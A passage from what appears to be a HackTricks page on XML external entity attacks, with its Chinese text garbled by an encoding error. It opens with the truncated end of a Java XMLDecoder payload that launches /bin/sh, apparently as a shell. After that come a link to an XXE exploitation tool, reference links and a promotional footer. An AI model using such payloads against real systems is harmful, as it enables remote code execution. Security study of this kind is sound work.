</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## å·¥å…·

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## æ›´å¤šèµ„æº

[https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
[https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
é€šè¿‡ä½¿ç”¨è‡ªå·±çš„å¤–éƒ¨ DTD ä» HTTP ä¸­æå–ä¿¡æ¯: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
[https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
[https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼:

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„ **å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢ [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
